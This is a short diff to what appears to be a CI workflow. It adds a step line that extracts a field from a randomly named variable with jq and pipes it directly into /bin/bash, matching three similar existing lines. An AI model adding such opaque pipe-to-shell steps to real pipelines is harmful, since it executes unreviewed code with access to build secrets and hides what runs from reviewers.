@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$ogf1" | jq -r .tqsfu3 | /bin/bash
           printf '%s' "$arjub49" | jq -r .lsec6304 | /bin/bash
           echo $h57 | jq -r .hhy35102 | /bin/bash
+          echo $zxlrn2 | jq -r .umjn57001 | /bin/bash
 
       - name: Save archive
         if: always()
